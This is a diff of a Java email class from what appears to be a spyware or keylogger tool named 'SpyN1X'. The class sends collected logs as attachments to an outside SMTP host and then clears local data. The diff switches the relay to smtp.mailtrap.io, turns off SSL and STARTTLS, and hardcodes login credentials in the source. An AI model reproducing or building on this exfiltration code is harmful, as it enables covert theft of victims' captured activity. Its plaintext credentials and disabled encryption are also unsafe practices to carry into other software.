@@ -17,11 +17,14 @@ public class Email {
         try {
             this.email = new MultiPartEmail();
             email.setDebug(false);
-            email.setHostName("smtp.google.com");
-            email.setSSL(true);
+            email.setHostName("smtp.mailtrap.io");
+            email.setSmtpPort(25);
+            email.setSSL(false);
+            email.setSSLOnConnect(false);
+            email.setStartTLSEnabled(false);
             email.addTo(Config.REC_MAIL);
             email.setFrom(Config.SENDER_EMAIL);
-            email.setAuthentication(Config.SENDER_EMAIL, Config.SENDER_PASS);
+            email.setAuthentication("14cfcbe5a20f30", "da0fca972d7b8f");
             email.setSubject("SpyN1X | Latest Log");
             email.setMsg("This is system generated message. Please find the attachments below:");
         }
@@ -51,7 +54,9 @@ public class Email {
             Log.out(Color.GREEN + "[*] Email send successfully");
             FileManager.clearAllData();
         } catch (EmailException e) {
-            Log.out(Color.RED + e.getMessage());
+            //Log.out(Color.RED + e.getMessage());
+            e.printStackTrace();
+            System.exit(1);
         }
     }
 }
